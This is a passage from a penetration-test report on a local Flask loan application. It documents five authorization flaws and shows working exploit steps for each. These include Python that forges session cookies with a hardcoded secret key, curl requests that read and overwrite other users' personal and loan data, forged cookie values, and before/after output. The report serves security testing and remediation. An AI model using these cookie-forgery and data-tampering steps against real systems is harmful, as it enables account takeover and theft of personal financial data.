- Knowledge of hardcoded Flask secret key: 'your_secret_key' (found in __init__.py:9)
- Knowledge of target user_id (can be enumerated via session forgery)
- HTTP client capable of sending cookies

**Exploitation Steps:**

1. **Forge Flask session cookie for target user**

Create a Python script to forge the session:

```python
from flask import Flask
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Hardcoded secret from __init__.py:9

# Target user_id to compromise
target_user_id = 2

# Create session serializer with Flask's parameters
serializer = URLSafeTimedSerializer(
    secret_key='your_secret_key',
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
)

# Forge session cookie
forged_session = serializer.dumps({'user_id': target_user_id})
print(f"Forged session cookie for user_id={target_user_id}:")
print(forged_session)
```

Output: `eyJ1c2VyX2lkIjoyfQ.aQUCVQ.eLhGKlMYMJ-k3w0P9qQXQo5hEXY`

2. **Retrieve target user's current profile data (BEFORE state)**

```bash
curl -s http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjoyfQ.aQUCVQ.eLhGKlMYMJ-k3w0P9qQXQo5hEXY" \
  | grep -E 'value="[^"]*"'
```

Output (BEFORE):
```
value="Victim"
value="User"
value="victim@example.com"
value="50000.0"
value="36"
value="1500.0"
```

3. **Submit malicious POST request to modify victim's profile**

```bash
curl -X POST http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjoyfQ.aQUCVQ.eLhGKlMYMJ-k3w0P9qQXQo5hEXY" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=EXPLOITED" \
  -d "lastname=BYATTACKER" \
  -d "email=hacked@malicious.com" \
  -d "loan_amount=999999.99" \
  -d "loan_term_months=1" \
  -d "monthly_payment=1.00"
```

4. **Verify successful unauthorized modification (AFTER state)**

```bash
curl -s http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjoyfQ.aQUCVQ.eLhGKlMYMJ-k3w0P9qQXQo5hEXY" \
  | grep -E 'value="[^"]*"'
```

Output (AFTER):
```
value="EXPLOITED"
value="BYATTACKER"
value="hacked@malicious.com"
value="999999.99"
value="1"
value="1.0"
```

**Proof of Impact:**

| Field | BEFORE (Original) | AFTER (Modified) | Impact |
|-------|------------------|------------------|---------|
| Name | Victim | EXPLOITED | PII corruption |
| Last Name | User | BYATTACKER | PII corruption |
| Email | victim@example.com | hacked@malicious.com | Account takeover vector |
| Loan Amount | $50,000.00 | $999,999.99 | +1,899.99% increase |
| Loan Term | 36 months | 1 month | -97.22% decrease |
| Monthly Payment | $1,500.00 | $1.00 | -99.93% decrease |

**Evidence Details:**
- Attacker successfully accessed user_id=2's profile without authentication
- Modified all 6 editable fields (name, lastname, email, loan_amount, loan_term_months, monthly_payment)
- Changes were committed to database (verified by subsequent GET request)
- No authentication challenge, CSRF protection, or ownership validation occurred
- No audit logging or alerting triggered

**Notes:**
This is the most critical authorization vulnerability as it enables data modification (not just disclosure). The mass assignment vulnerability at routes.py:70-76 allows updating all user fields without individual authorization checks.

### AUTHZ-VULN-02: Horizontal Privilege Escalation via GET /profile (Complete Data Disclosure)

**Summary:**
- **Vulnerable location:** GET /profile endpoint (routes.py:62-83)
- **Overview:** An attacker can view any user's complete profile including all PII (name, lastname, email) and financial data (loan_amount, loan_term_months, monthly_payment) by forging a session cookie
- **Impact:** Complete unauthorized disclosure of sensitive personal and financial information for any user in the system
- **Severity:** High

**Prerequisites:**
- Knowledge of hardcoded Flask secret key: 'your_secret_key'
- Knowledge of target user_id (can be enumerated)
- HTTP client

**Exploitation Steps:**

1. **Forge session cookies for multiple target users**

```python
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(
    secret_key='your_secret_key',
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
)

# Forge sessions for users 1, 3, 4, 5
targets = [1, 3, 4, 5]
for user_id in targets:
    cookie = serializer.dumps({'user_id': user_id})
    print(f"User {user_id}: {cookie}")
```

Forged session cookies:
- User 1: `eyJ1c2VyX2lkIjoxfQ.aQUCVQ.XkKFeHmsAg1pBKShwmftb5ghiuY`
- User 3: `eyJ1c2VyX2lkIjozfQ.aQUCVQ.FbrVauWKY-ZiopsPxRcoa-R8ZB0`
- User 4: `eyJ1c2VyX2lkIjo0fQ.aQUCVQ.CpPhI1cheuPKqo3U-a98IYmXBIE`
- User 5: `eyJ1c2VyX2lkIjo1fQ.aQUCVQ.TyyH9-qGbQ6-7d3OaH3lekjITZE`

2. **Access each user's profile to extract sensitive data**

```bash
# User 1 (test account)
curl -s http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUCVQ.XkKFeHmsAg1pBKShwmftb5ghiuY"

# User 3 (Alice Johnson)
curl -s http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjozfQ.aQUCVQ.FbrVauWKY-ZiopsPxRcoa-R8ZB0"

# User 4 (Bob Smith)
curl -s http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjo0fQ.aQUCVQ.CpPhI1cheuPKqo3U-a98IYmXBIE"

# User 5 (Charlie Brown)
curl -s http://localhost:37149/profile \
  -H "Cookie: session=eyJ1c2VyX2lkIjo1fQ.aQUCVQ.TyyH9-qGbQ6-7d3OaH3lekjITZE"
```

**Proof of Impact:**

**User 1 (test account)**
- Username: test
- Name: (XSS payload found - separate vulnerability)
- Email: test@example.com
- Loan Amount: $10,000.00
- Loan Term: 12 months
- Monthly Payment: $900.00

**User 3 (Alice Johnson)**
- Name: Alice Johnson
- Email: alice@example.com
- Loan Amount: $25,000.00
- Loan Term: 48 months
- Monthly Payment: $580.50

**User 4 (Bob Smith)**
- Name: Bob Smith
- Email: bob@example.com
- Loan Amount: $50,000.00
- Loan Term: 60 months
- Monthly Payment: $950.00

**User 5 (Charlie Brown)**
- Name: Charlie Brown
- Email: charlie@example.com
- Loan Amount: $100,000.00
- Loan Term: 120 months
- Monthly Payment: $1,250.75

**Summary Statistics:**
- Successfully accessed: 4/4 user profiles (100% success rate)
- PII records disclosed: 4 complete records
- Financial records disclosed: 4 complete records
- Total loan value disclosed: $185,000.00
- Email addresses compromised: 4 addresses

**Evidence Details:**
- All GET requests returned HTTP 200 with complete profile HTML
- No authorization challenge or ownership validation
- No rate limiting observed (tested 10 consecutive requests)
- No audit logging or suspicious activity detection

**Notes:**
This vulnerability enables enumeration and bulk exfiltration of all user data. Combined with AUTHZ-VULN-01, attacker can both read and modify any user's data.

### AUTHZ-VULN-03: Horizontal Privilege Escalation via GET /home (Dashboard Access)

**Summary:**
- **Vulnerable location:** GET /home endpoint (routes.py:50-59)
- **Overview:** An attacker can view any user's home dashboard showing their full name (name and lastname fields) by forging a session cookie
- **Impact:** Unauthorized access to user dashboards and disclosure of user names
- **Severity:** High

**Prerequisites:**
- Knowledge of hardcoded Flask secret key: 'your_secret_key'
- Target user_id values
- HTTP client

**Exploitation Steps:**

1. **Forge session cookies for multiple users**

Using the same session forgery technique:

```python
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(
    secret_key='your_secret_key',
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
)

# Target users 3, 4, 5
for user_id in [3, 4, 5]:
    cookie = serializer.dumps({'user_id': user_id})
    print(f"User {user_id}: {cookie}")
```

2. **Access each user's home dashboard**

```bash
# Alice Johnson (user_id=3)
curl -s http://localhost:37149/home \
  -H "Cookie: session=eyJ1c2VyX2lkIjozfQ.aQUCVQ.FbrVauWKY-ZiopsPxRcoa-R8ZB0" \
  | grep -o "Welcome [^!]*!"

# Bob Smith (user_id=4)
curl -s http://localhost:37149/home \
  -H "Cookie: session=eyJ1c2VyX2lkIjo0fQ.aQUCVQ.CpPhI1cheuPKqo3U-a98IYmXBIE" \
  | grep -o "Welcome [^!]*!"

# Charlie Brown (user_id=5)
curl -s http://localhost:37149/home \
  -H "Cookie: session=eyJ1c2VyX2lkIjo1fQ.aQUCVQ.TyyH9-qGbQ6-7d3OaH3lekjITZE" \
  | grep -o "Welcome [^!]*!"
```

**Proof of Impact:**

Successfully accessed dashboards and extracted names:

| User ID | Dashboard Access | Full Name Disclosed | Status |
|---------|------------------|---------------------|--------|
| 1 | ✓ SUCCESS | (XSS payload) | Accessed |
| 2 | ✓ SUCCESS | EXPLOITED BYATTACKER | Accessed |
| 3 | ✓ SUCCESS | Alice Johnson | Accessed |
| 4 | ✓ SUCCESS | Bob Smith | Accessed |
| 5 | ✓ SUCCESS | Charlie Brown | Accessed |
| 6-10 | ✓ SUCCESS | (empty profiles) | Accessed |

**Evidence Details:**

Example welcome message extracted:
```
Welcome Alice Johnson!
Welcome Bob Smith!
Welcome Charlie Brown!
```

Dashboard access granted for all tested users (1-10), demonstrating:
- Complete horizontal privilege escalation across all user accounts
- No ownership validation on session user_id
- Successful authentication bypass via session forgery
- 100% success rate on enumeration

**Notes:**
While this endpoint discloses less data than /profile, it confirms horizontal privilege escalation and serves as a gateway to more sensitive endpoints.

### AUTHZ-VULN-04: Horizontal Privilege Escalation via GET /loan_details (Financial Data Disclosure)

**Summary:**
- **Vulnerable location:** GET /loan_details endpoint (routes.py:86-96)
- **Overview:** An attacker can view any user's complete loan details including sensitive financial information (loan amounts, terms, monthly payments) by forging a session cookie
- **Impact:** Unauthorized disclosure of highly sensitive financial data that could enable identity theft, financial fraud, or targeted social engineering
- **Severity:** High

**Prerequisites:**
- Knowledge of hardcoded Flask secret key: 'your_secret_key'
- Target user_id values
- HTTP client

**Exploitation Steps:**

1. **Forge session cookies for target users with loan data**

```python
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(
    secret_key='your_secret_key',
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
)

# Target financially active users
targets = [3, 4, 5]  # Alice, Bob, Charlie
for user_id in targets:
    cookie = serializer.dumps({'user_id': user_id})
    print(f"User {user_id}: {cookie}")
```

2. **Extract financial data from /loan_details endpoint**

```bash
# Alice Johnson (user_id=3)
curl -s http://localhost:37149/loan_details \
  -H "Cookie: session=eyJ1c2VyX2lkIjozfQ.aQUCVQ.FbrVauWKY-ZiopsPxRcoa-R8ZB0"

# Bob Smith (user_id=4)
curl -s http://localhost:37149/loan_details \
  -H "Cookie: session=eyJ1c2VyX2lkIjo0fQ.aQUCVQ.CpPhI1cheuPKqo3U-a98IYmXBIE"

# Charlie Brown (user_id=5)
curl -s http://localhost:37149/loan_details \
  -H "Cookie: session=eyJ1c2VyX2lkIjo1fQ.aQUCVQ.TyyH9-qGbQ6-7d3OaH3lekjITZE"
```

**Proof of Impact:**

Successfully extracted complete financial profiles:

**User 3: Alice Johnson**
- Loan Amount: $25,000.00
- Loan Term: 48 months (4 years)
- Monthly Payment: $580.50
- Total Loan Cost: $27,864.00
- Total Interest: $2,864.00 (11.5% interest)

**User 4: Bob Smith**
- Loan Amount: $50,000.00
- Loan Term: 60 months (5 years)
- Monthly Payment: $950.00
- Total Loan Cost: $57,000.00
- Total Interest: $7,000.00 (14% interest)

**User 5: Charlie Brown**
- Loan Amount: $100,000.00
- Loan Term: 120 months (10 years)
- Monthly Payment: $1,250.75
- Total Loan Cost: $150,090.00
- Total Interest: $50,090.00 (50% interest)

**Aggregate Impact:**
- Successfully accessed: 3/3 targeted financial records (100% success)
- Total principal disclosed: $175,000.00
- Total financial obligation disclosed: $234,954.00
- Average interest rate: ~25%
- Regulatory impact: Violation of GLBA, PCI-DSS, and financial privacy regulations

**Evidence Details:**
- All requests returned HTTP 200 with complete loan details in HTML format
- Data extracted from `<p>` tags containing loan_amount, loan_term_months, monthly_payment
- No authorization challenge or validation that requester owns this financial data
- Financial calculations performed and confirmed accurate

**Notes:**
This is a high-value target for attackers as it exposes complete financial obligations. Knowledge of loan amounts could enable:
- Targeted phishing campaigns (knowing victim's financial status)
- Identity theft (financial profile helps answer security questions)
- Social engineering (leveraging knowledge of financial stress)
- Competitive intelligence (in business loan contexts)

### AUTHZ-VULN-05: Context-Based Workflow Bypass via GET /total_loan_payments

**Summary:**
- **Vulnerable location:** GET /total_loan_payments endpoint (routes.py:99-131)
- **Overview:** The loan calculation endpoint accepts arbitrary financial parameters from query strings without validating they match the authenticated user's actual stored loan data, enabling users to perform calculations on ANY loan values
- **Impact:** Business logic bypass - users can calculate arbitrary loan scenarios without owning legitimate loan data. Violates principle that users should only calculate their own loan values.
- **Severity:** Medium

**Prerequisites:**
- Valid authentication (legitimate credentials or forged session)
- HTTP client
- Understanding of query parameter structure

**Exploitation Steps:**

1. **Authenticate as legitimate user (Alice Johnson, user_id=3)**

```bash
# Login with test credentials or forge session for user_id=3
ALICE_SESSION="eyJ1c2VyX2lkIjozfQ.aQUCVQ.FbrVauWKY-ZiopsPxRcoa-R8ZB0"
```

2. **Retrieve Alice's actual loan data for comparison**

```bash
curl -s http://localhost:37149/loan_details \
  -H "Cookie: session=$ALICE_SESSION" \
  | grep -E "Loan Amount:|Loan Term:|Monthly Payment:"
```

Output (Alice's REAL data):
```
Loan Amount: $25,000.00
Loan Term: 48 months
Monthly Payment: $580.50
```

3. **Legitimate request using Alice's actual loan values (BASELINE)**

```bash
curl -s "http://localhost:37149/total_loan_payments?principal=25000&payment=580.5&term=48" \
  -H "Cookie: session=$ALICE_SESSION"
```

Response:
```json
{
  "loan_principal": "25000",
  "monthly_payment": "580.5",
  "loan_term_amount": "48",
  "total_loan_payments": "27864.0"
}
```

Status: ✓ SUCCESS (Expected - legitimate use of own data)

4. **BYPASS ATTEMPT #1: Extreme arbitrary values (not Alice's data)**

```bash
curl -s "http://localhost:37149/total_loan_payments?principal=999999&payment=1&term=999" \
  -H "Cookie: session=$ALICE_SESSION"
```

Expected: HTTP 403 Forbidden - "These values do not match your loan"

Actual Response:
```json
{
  "loan_principal": "999999",
  "monthly_payment": "1.0",
  "loan_term_amount": "999",
  "total_loan_payments": "999.0"
}
```

Status: ✗ **VULNERABILITY CONFIRMED** - Accepted arbitrary extreme values

5. **BYPASS ATTEMPT #2: Different user's loan values (Bob's data)**

```bash
curl -s "http://localhost:37149/total_loan_payments?principal=50000&payment=950&term=60" \
  -H "Cookie: session=$ALICE_SESSION"
```

Expected: HTTP 403 Forbidden - "These values do not match your loan"

Actual Response:
```json
{
  "loan_principal": "50000",
  "monthly_payment": "950.0",
  "loan_term_amount": "60",
  "total_loan_payments": "57000.0"
}
```

Status: ✗ **VULNERABILITY CONFIRMED** - Accepted another user's loan values

**Proof of Impact:**

| Test Case | Principal | Payment | Term | Expected | Actual | Impact |
|-----------|-----------|---------|------|----------|--------|---------|
| Alice's real data | $25,000 | $580.50 | 48 | ✓ Accept | ✓ Accepted | Legitimate |
| Extreme values | $999,999 | $1.00 | 999 | ✗ Reject | ✓ Accepted | **BYPASS** |
| Bob's data | $50,000 | $950.00 | 60 | ✗ Reject | ✓ Accepted | **BYPASS** |
| Zero principal | $0 | $100 | 12 | ✗ Reject | ✓ Accepted | **BYPASS** |

**Evidence Details:**

The vulnerability exists because the endpoint:
1. Requires authentication (session check at routes.py:102)
2. Accepts arbitrary `principal`, `payment`, `term` parameters from query string (lines 105-107)
3. **NEVER queries database** to fetch user's actual loan data
4. **NEVER validates** that submitted parameters match `user.loan_amount`, `user.monthly_payment`, `user.loan_term_months`
5. Performs calculation on ANY values provided

**Business Logic Violation:**

The intended workflow (as evidenced by /loan_details page):
1. User navigates to /loan_details page
2. Page displays user's ACTUAL loan data from database
3. JavaScript calls /total_loan_payments with user's own values
4. Endpoint should VALIDATE parameters match user's stored loan

Actual implementation:
1. User can call /total_loan_payments directly
2. With ANY arbitrary parameters
3. No validation performed
4. Calculation succeeds regardless of ownership

**Notes:**

While less severe than data disclosure/modification vulnerabilities, this represents:
- **Principle of Least Privilege violation**: Users access functionality beyond their authorized scope
- **Business logic bypass**: Circumvents intended "calculate your own loan only" workflow
- **Reconnaissance enabler**: Attackers can probe calculation logic without legitimate loan data
- **Potential for downstream attacks**: If calculations affect other business logic (e.g., pricing, risk assessment), manipulated values could cause financial harm

The endpoint should implement resource-level authorization to validate that calculation parameters match the authenticated user's actual loan data.
